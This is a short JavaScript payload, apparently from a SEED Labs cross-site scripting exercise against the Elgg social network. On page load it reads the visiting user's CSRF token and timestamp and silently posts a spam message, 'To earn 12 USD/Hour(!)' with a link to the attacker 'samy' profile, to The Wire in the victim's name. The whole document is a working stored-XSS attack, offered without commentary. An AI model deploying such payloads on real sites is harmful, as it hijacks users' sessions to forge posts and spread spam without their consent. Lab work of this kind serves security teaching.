window.onload = function(){
    if(elgg.session.user.guid && elgg.session.user.guid != 59 ){

        let formData = new FormData();
        let ts=elgg.security.token.__elgg_ts;
        let token=elgg.security.token.__elgg_token;
        
        let post = "To earn 12 USD/Hour(!), visit now http://www.seed-server.com/profile/samy"
        
        formData.append('__elgg_token', token);
        formData.append('__elgg_ts', ts);
        formData.append('body', post);
       
    
        var sendurl ="http://www.seed-server.com/action/thewire/add" 
    
    
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        Ajax.send(formData);
    }
}